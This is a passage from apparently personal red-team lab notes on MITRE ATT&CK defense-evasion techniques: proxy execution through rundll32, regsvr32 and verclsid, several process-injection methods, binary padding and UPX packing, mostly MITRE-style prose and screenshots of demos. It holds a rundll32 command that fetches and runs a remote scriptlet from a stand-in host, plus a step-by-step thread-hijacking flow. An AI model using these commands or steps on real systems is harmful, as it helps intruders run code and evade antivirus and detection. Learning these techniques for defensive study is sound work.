![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkYsMT_--86drnHom5%2F-MRkYuQBUT6eIUElTwE7%2Fimage.png?alt=media&token=647b50b1-0579-47fb-bf58-738b073305dd)

We can see on our server it was called as well

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkYsMT_--86drnHom5%2F-MRkYvImw3xdh6_Th_mc%2Fimage.png?alt=media&token=bb26ed6e-c86d-4c7c-9801-fed4db259ec2)

Had to be quick and capture the execution on Process Explorer.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkYsMT_--86drnHom5%2F-MRkYw2x2a3t1xguCAv2%2Fimage.png?alt=media&token=a3170860-c111-497a-ba09-010fc6622872)

References:

​

[https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/](https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/)

### untitled-1

Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. Shared Modules), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allow lists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads.

Rundll32.exe can also be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions Control_RunDLL and Control_RunDLLAsUser. Double-clicking a .cpl file also causes rundll32.exe to execute.

Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: 

**rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"**

 This behavior has been seen used by malware such as Poweliks.

**Example**

The popular rundll32 this utility is well known for execution and Defense Evasion, the binary is proxy aware as well and can execute from remote hosts UNC Paths or HTTP paths.

The following Demo is a sample of just executing calc on the localhost

**Demo-Rundll32:**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkYx25PnZrU-n85rXo%2F-MRkZ2XcY3cRpMBsdtpJ%2FProxy-Execution-Rundll32.gif?alt=media&token=0cbb888d-093f-4dbe-b6a9-6622ca0eaea3)

### untitled

Adversaries may abuse verclsid.exe to proxy execution of malicious code. Verclsid.exe is known as the Extension CLSID Verification Host and responsible for verifying each shell extension before that are used by Windows Explorer or the Windows Shell.

Adversaries may abuse verclisd.exe to execute malicious payloads. This may be achieved by running verclsid.exe /S /C {{CLSID}}, where the file is referenced by a Class ID (CLSID), a unique identification number used to identify COM objects. COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets (SCT) from remote servers (similar to Regsvr32). Since it is signed and native on Windows systems, proxying execution via verclsid.exe may bypass application control solutions that do not account for its potential abuse.

**Example**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkZ4fZNfVhdzlj_cH4%2F-MRkZD4czWqUj4GCeQfd%2FProxy-Execution-Verclsid.gif?alt=media&token=3b5cb049-2778-4e12-b2c0-773cc71fc8ec)

**References:**

ReaCOM/Verclsid.md at master · homjxi0e/ReaCOM

GitHub

​

[COM Hijacking Launch ingress SCT Using xwizard.exe invoke-CLSID COM](https://www.youtube.com/watch?v=nAz4hqtFGc0)

Abusing the COM Registry Structure (Part 2): Hijacking & Loading Techniques

bohops

## t1055-process-injection

Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process

There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific.

More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communications (IPC) mechanisms as a communication channel.

### dynamic-link-library-injection

Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.

DLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as VirtualAllocEx and WriteProcessMemory, then invoked with CreateRemoteThread (which calls the LaodLibrary API responsible for loading the DLL).

Variations of this method such as reflective DLL injection  (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually performing the function of LoadLibrary).

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process.

**Example:**

From the tool InjectAllTheThings we are capable of injecting DLL files into processes and hide our actions as long is within reason of a process communicating with the internet. We have 7 different methods here:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhtd5zKwo1x7YfSJxv%2F-MRhuUjlax5tvCp0Fq25%2Fimage.png?alt=media&token=5debd10e-e426-4843-aaf5-57e63bc59458)

I won't explain this as this is way beyond beginner level but in simple terms it uses those API calls to inject DLLs into legitimate processes to hide its intentions.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhtd5zKwo1x7YfSJxv%2F-MRhuWJZS4uAJe2cW0wp%2Fimage.png?alt=media&token=cf0ef4b4-b409-44fb-b8ad-5fdafbd49809)

Will choose option 1 and fill the needed parameters.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhtd5zKwo1x7YfSJxv%2F-MRhuX88h2ITN8QEgrl7%2Fimage.png?alt=media&token=3559bbe9-a65f-4ceb-83b7-261625a25e4d)

I will take a look using Process Explorer and see what happened.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhtd5zKwo1x7YfSJxv%2F-MRhuXup_HHYvFfe_2Ue%2Fimage.png?alt=media&token=8d59efb6-cca3-43ef-beb3-41a4bbac4d7f)

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhtd5zKwo1x7YfSJxv%2F-MRhu_ThmQJf3cKPYgBd%2Fimage.png?alt=media&token=73865c8d-a922-4e47-bfef-e14f81979450)

We see above that rundll32.exe is now a child process of notepad.exe And it is using a Network connection with the port 4444

Check the TaskManager

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhtd5zKwo1x7YfSJxv%2F-MRhuaOz-Dp9mA1bTIzb%2Fimage.png?alt=media&token=4659f7d1-dfda-43b0-bdbe-613909d67eb0)

A bunch of Subprocesses running under Notepad, and even when closing these we still have notepad running in the background and stays available for us still to see in the Process Explorer Application.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhtd5zKwo1x7YfSJxv%2F-MRhubUz3EevxZQ681Yg%2Fimage.png?alt=media&token=e35a6345-ce42-45d8-8988-0a1ce5a40207)

A great technique for evading since we are hiding under the legitimacy of another process and maybe even escalating privileges.

### portable-execution-injection

Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process.

PE injection is commonly  performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as VirtualAllocEx and WriteProcessMemory, then invoked with CreateRemoteThread or additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references.

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process.

**Example:**

In this demo will be working with a C++ code from iredteam.

In the Demo its demonstrated that we will need the PID of the process we want to inject to will focus on 

**notepad.exe.**

Once locating the PID of the process we will edit the code as necessary to inject.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhucIqy-tuPd3C-Wrx%2F-MRhukFSOjK6W6vQqRmz%2Fimage.png?alt=media&token=978b09d1-098a-4371-bf78-c8c02d69d89a)

Now edit the code as necessary to find the correct PID of the process.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhucIqy-tuPd3C-Wrx%2F-MRhul2MirC_2umJySaO%2Fimage.png?alt=media&token=9d680a1b-9864-4926-af08-334e55e16090)

Once this is properly added we can compile and move the executable to the workstation, I lightly edited the code so It executes calc instead of a message box.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhucIqy-tuPd3C-Wrx%2F-MRhulrxDbmWWFJWbOR9%2Fimage.png?alt=media&token=de38a2e0-c81f-48ea-a010-05fdc033e5a0)

Once the binary is executed we have calc pop-up.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhucIqy-tuPd3C-Wrx%2F-MRhun-B7JogYnKn_Q2z%2Fimage.png?alt=media&token=feeceabc-27e6-43ab-8432-a270e7b569bb)

We can see above that calc becomes a child process of notepad.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhucIqy-tuPd3C-Wrx%2F-MRhv-WphHV6JddvTumT%2FPE-Injection.gif?alt=media&token=45b3a3da-7b89-41e5-8928-f58beb6a845c)

Reference:

PE Injection: Executing PEs inside Remote Processes

Red Teaming Experiments

PE injection explained -  Sevagas

Portable Executable Injection For Beginners - MalwareTech

MalwareTech

https://github.com/r00t-3xp10it/pe-union?fbclid=IwAR0j3HKFvqFlsnpBnpI36KhguvvYTHUv1TW0vp1oLpZzyfkJOrvOG9wazP4

github.com

PEunion - bytecode77

​

### thread-execution-hijacking

Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process.

Thread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as OpenThread. At this point the process can be suspended then written to, realigned to the injected code, and resumed via SuspendThread, VirtualAllocEx, WriteProcessMemory, SetThreadContext, then ResumeThread respectively.

This is very similar to Process Hollowing but targets an existing process rather than creating a process in a suspended state.

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution hijacking may also evade detection from security products since the execution is masked under a legitimate process.

**Example:**

Here will use a tool ThreadInject this currently works with only 32bit processes so in this sample I will use a 32-bit process and inject a DLL into the process, then this will pause and restart the thread of the process, once it reaches the proper location it will execute the DLL.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhucIqy-tuPd3C-Wrx%2F-MRhvF_IDu_7_bl7TWL7%2Fimage.png?alt=media&token=70618383-93ef-4e13-8b0c-0da37918c564)

Flow of injection

1) Parse the DLL name and the target process ID from command line.

2) Allocate buffer for the shellcode and DLL name.

3) Copy the shellcode to the buffer.

4) Copy the DLL name to the end of shellcode.

5) Open the target process handle.

6) Allocate memory in the target process.

7) Find a running thread to hijack.

8) Get the context of the target thread.

9) Write the eip register to the shellcode.

10) Write the address of LoadLibrary to the shellcode.

11) Write the shellcode and DLL name to the target process.

12) Hijack a running thread in the target process to execute the shellcode.

13) The hijacked thread executes the shellcode. The shellcode calls the LoadLibrary function to load the DLL.

14) The shellcode returns, and the thread continue to execute its own code.

References:

Context Thread ALL The Things | Development & Security

Thread Hijacker - Professional Code

rohitab.com - Forums

DLL injection via thread hijacking - Source Codes

GitHub - D4stiny/ThreadJect: Manual DLL Injector using Thread Hijacking.

GitHub

GitHub - MandConsultingGroup/ThreadBoat: Program Uses Thread Execution Hijacking To Inject Native Shell-code Into a Standard Win32 Application

### asynchronous-procedure-call

Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process.

APC injection is commonly performed by attaching malicious code to the APC queue of a process's thread. Queued APC functions are executed when the thread enters an alternable state. A handle to an existing victim process is first created with native Windows API calls such as OpenThread. At this point qQueueUserAPC can be used to invoke a function (such as LoadLibraryA pointing to a malicious DLL).

A variation of APC injection, dubbed "Early Bird Injection", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC. AtomBombing is another variation that utilizes APCs to invoke malicious code previously written to the global atom table.

Running code in the context of another process may allow access to the process's memory , system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process.

**Example:**

In this example using a C++ Project will reach the goal of reach APC Injection too cut time the malicious code will also create the process we need in a suspended state the APC is queued and the thread resumes and the shell code is executed.

I will be starting a listener on my attacking machine, since I placed the shellcode into the project and compiled this should just need to run and we will receive a shell

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhvN_hOgqC10Khi9LR%2F-MRhvfPOeHfnDaUrQhmd%2Fimage.png?alt=media&token=6b2ae1f6-d7e4-4d12-af53-69a862546cc6)

Execution:

It calls calc.exe

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhvN_hOgqC10Khi9LR%2F-MRhvgR8zL2lWR47MAhI%2Fimage.png?alt=media&token=12e0461a-7233-4666-9666-dd53f14a74db)

A connection is established when checking the network properties on Process Explorer

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhvN_hOgqC10Khi9LR%2F-MRhvhJ_26vg0ldJ-Hm3%2Fimage.png?alt=media&token=14fa37e8-bc13-43cd-a000-5f52c47b67b3)

**Demo**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhvN_hOgqC10Khi9LR%2F-MRhvjnKeGs7TP183r8U%2FAPC-Injection.gif?alt=media&token=6bd92b41-ee76-49c2-a24b-a2618193af20)

References:

​

[https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection](https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection)

https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection

https://www.ired.team/offensive-security/code-injection-process-injection/apc-queue-code-injection

[https://www.ired.team/offensive-security/code-injection-process-injection/apc-queue-code-injection](https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection)

https://askbob.tech/asynchronous-procedure-calls/

[https://askbob.tech/asynchronous-procedure-calls/](https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection)

### thread-local-storage

Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevated privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process.

TLS call back injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads. Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within process' memory space using other Process Injection techniques such as Process Hollowing.

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via TLS callback injection since the execution is masked under a legitimate process.

**Example**

Thread Local Storage callbacks are mechanisms provided by the Windows Loader to allow programs to perform initilisation tasks that are thread specific when a process starts. What is interesting about TLS callbacks is that they are executed 

** before the entry point of the application**

, so before the main() function. This is problematic for a couple of reason:

·         Debuggers usually stop at the main function, thus missing any extra TLS code

·         Disassemblers and static analysis tools first present the main function, again leading to possibly hidden code.

To use these we need to declare the prototype

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhvlinb7iVXyCh37gb%2F-MRhvwsTVH6nVYVZKQ9k%2Fimage.png?alt=media&token=fd44477b-3f6b-48b7-92e3-86a36e7bb414)

Callbacks are defined like this:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhvlinb7iVXyCh37gb%2F-MRhvxpK_n-OqOBa6sZR%2Fimage.png?alt=media&token=70f6488a-f962-48d0-9558-7fb5c36d8c1a)

Now let me show the sample code

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhvlinb7iVXyCh37gb%2F-MRhvyiH9xGAH9Pazdzi%2Fimage.png?alt=media&token=6dcb1d27-06cd-42a6-9d9d-98ad634b16a4)

We see above that we declared the TLS Callback and we have our main function below, once executed the main function will never get executed becvause of the ExitProcess() in the TLSCallback declaration, of course we can remove this and have it print in the console, but in here will just demonstrate the TLS and then have it terminate as what it's meant to do.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhvlinb7iVXyCh37gb%2F-MRhvzaydeCkQbkw0n0m%2Fimage.png?alt=media&token=705366d7-3154-4f96-a1a9-758c7c00c2ba)

Once we hit Ok, the process simply terminate as intended

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhvlinb7iVXyCh37gb%2F-MRhw-plFQGBxaNF4m0C%2Fimage.png?alt=media&token=e4fce4b6-8335-462e-8de7-04ae456ca211)

We see above that the main section of the code where it just supposed to print some text in the console didn't execute since our TLS callback was the first to execute and terminate the process before reaching the main section

There were samples where these TLSCallbacks would execute even before loading onto a debugger

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhvlinb7iVXyCh37gb%2F-MRhw0wIl2sESZJqkg3q%2Fimage.png?alt=media&token=b8e3ec62-75b0-4fd1-a1f0-c0a6cb5b1851)

I couldn't replicate this but it's good to be aware of.

References:

GitHub - reversinghub/TLS-PoC: PoC for using TLS in Win8.1 and above

GitHub

​

[Hiding Code Behind Thread-Local Storage - Reverse Engineering TLS Callbacks](https://www.youtube.com/watch?v=mZMCxhLkS4g)

### extra-window-memory-injection

Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process.

Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data). Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value.

Although small, the EWM is large enough to store a 32-bit pointer and is often used to point to a window procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process's memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process's EWM.

Execution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as WriteProcessMemory and CreateRemoteThread. More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.

Running code in the context of another process may allow access to the process's memory system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process.

**Example:**

**I CAN'T REPLICATE IT**

### process-hollowing

Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.

Process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as CreateProcess, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as ZwUnmapViewOfSection or NtUnmapViewOfSection before being written to, realigned to the injected code, and resumed via VirtualAllocEx, WriteProcessMemory, SetThreadContext, then ResumeThread respectively.

This is very similar to Thread Local Storage but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and this inherits the  security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process.

**Example**

In easy terms to understand this technique is let us imagine this is a piece of code that runs the famous calculator.

B8F73405B620443B4325B0943287B9R

This code is the one responsible for executing the calc.exe binary in windows In process hollowing we are trying to suspend the process, carve out a piece of code and insert our own and have it execute. Now let's say this code is the one that runs our payload (Hello World).

**AHIUDSGHIODSH**

Now we want to insert this code into our calculator process. So the technique will simply grab:

Remove some code

B8F7340<EMPTY>287B9R

And inject our payload

B8F7340

AHIUDSGHIODSH

287B9R

In the following Demo the technique will execute svchost, suspend it and inject a hello world binary onto the process, in the code the path to the binary is in the working directory so both are placed in the same directory.

**Demo:**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkBO5ZvckkHt7kmPWP%2F-MRkBkQQP8ZNpqlnXnN2%2FProcess-Hollowing.gif?alt=media&token=44b0e58b-f52f-4e44-b826-a809619b169d)

References:

​

[https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations](https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations)

### process-doppelganging

Adversaries may inject malicious code into process via process doppelganging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelganging is a method of executing arbitrary code in the address space of a separate live process.

Windows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction.

Although deprecated, the TxF application programming interface (API) is still enabled as of Windows 10.

Adversaries may abuse TxF to perform a file-less variation of Process Injection. Similar to Process Hollowing, process doppelganging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelganging use of TxF also avoids the use of highly-monitored API functions such as NtUnmapViewOfSection, VirtualProtectEx, and SetThreadContext.

Process Doppleganging in implemented in 4 steps

·         Transact - Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction

·         Load - Create a shared section of memory and load the malicious executable.

·         Rollback - Undo changes to original executable, effectively removing malicious code from the file system

·         Animate - Create a process from the tainted section of memory and initiate execution.

This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelganging may evade detection from security products since the execution is masked under a legitimate process.

**Example**

In this Demo I will use the POC form hasherezade and demonstrate the technique on what is going on with Process Explorer from SysInternals

I have no idea why I couldn't replicate same architecture, OS and processes but no success. I managed to compile them both but also no idea what is going on, Image below from iredteam

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhwT9ri1WNbvLuhoQ5%2F-MRhwdDks-z-FUX_Y3o6%2Fimage.png?alt=media&token=b6e719c6-6f58-4704-b5dd-9aa7dca35ebf)

**iredTeam**

Process Explorer actually represents the mimikatz process as zone.txt - this is because multiple Process Environment Block's (PEB) memory structures of the newly created process were modified during the new process creation

References:

​

[https://www.reveantivirus.com/blog/en/process-doppelganging](https://www.reveantivirus.com/blog/en/process-doppelganging)

https://www.reveantivirus.com/blog/en/process-doppelganging

https://thehackernews.com/2017/12/malware-process-doppelganging.html

[https://thehackernews.com/2017/12/malware-process-doppelganging.html](https://www.reveantivirus.com/blog/en/process-doppelganging)

https://github.com/hasherezade/process_doppelganging

[https://github.com/hasherezade/process_doppelganging](https://www.reveantivirus.com/blog/en/process-doppelganging)

https://blog.malwarebytes.com/threat-analysis/2018/08/process-doppelganging-meets-process-hollowing_osiris/

[https://blog.malwarebytes.com/threat-analysis/2018/08/process-doppelganging-meets-process-hollowing_osiris/](https://www.reveantivirus.com/blog/en/process-doppelganging)

## t0127-obfuscated-files-or-information

Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its content on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.

Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. Adversaries may also use compressed or archived scripts, such as JavaScript.

Portion of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled.

Adversaries may also obfuscate commands executed from payloads or directly via a Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detection's and application control mechanisms.

### binary-padding

Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations.

Binary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures. The padding used is commonly generated by a function to create junk data and the appended to the end or applied to sections of malware. Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designated or configured to scan large files. This may also reduce the  likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.

**Example:**

I will use a simple Python Script to make an EXE file bigger than what it normally is and try to evade some defenses, a simple demo here is that usually these AV products have a limit to file scanning if 15MB files so let us make it a little bigger.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhs5rUvanR9TKAxQO7%2F-MRhsIlJsFnnSbHtsvtb%2Fimage.png?alt=media&token=7bfc30f2-079b-469e-b251-6dc25b475807)

Above you see the payload with a 7kb file size, very fast to detect and scan

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhs5rUvanR9TKAxQO7%2F-MRhsJWE9vtw6G5sYfoG%2Fimage.png?alt=media&token=0dfdaf49-5bb6-4e96-a231-7f20bd834e0e)

With the tool I selected my payload and gave it the option of being 20 MB in file size

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhs5rUvanR9TKAxQO7%2F-MRhsKFyrxbYZ5ub8EzF%2Fimage.png?alt=media&token=06b91bed-3dc2-41f2-b901-b445b953c6e2)

Let's see the file size

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhs5rUvanR9TKAxQO7%2F-MRhsL5bY_DaiEyQSTaN%2Fimage.png?alt=media&token=5223ac73-7e2e-4c5d-88dc-a6b976f9ddab)

Now I will move the payload to the Workstation and check that its original functionality hasn't changed

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhs5rUvanR9TKAxQO7%2F-MRhsLssKSvHJ68RvM7d%2Fimage.png?alt=media&token=c61d94da-c3ce-4cc4-b12f-5246c6a97576)

Nope

This demo is just to understand that by padding and making our executable bigger AV Scanners don't check these files properly or simply skip them. It can be a bunch of garbage strings and bytes but it won't affect our payloads functionality.

### software-packing

Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.

Utilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries mat create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.

**Example:**

Many software packers exist to make some of our payloads smaller and use some form of packing when needed to move to different places.

Here I will use UPX a very well-known packer for binaries.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhs5rUvanR9TKAxQO7%2F-MRhsTzO7eZ3aHq-gJsn%2Fimage.png?alt=media&token=c3f4bc4e-b92c-4412-a8db-1efbe738a5bf)

Now will work with our previous payload that was padded until the file size changed from 7 kb to 20MB

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhs5rUvanR9TKAxQO7%2F-MRhsUw9NmKby64eLviA%2Fimage.png?alt=media&token=5c36f026-adf9-4397-b256-d58cc8a22061)

And packed Size now.

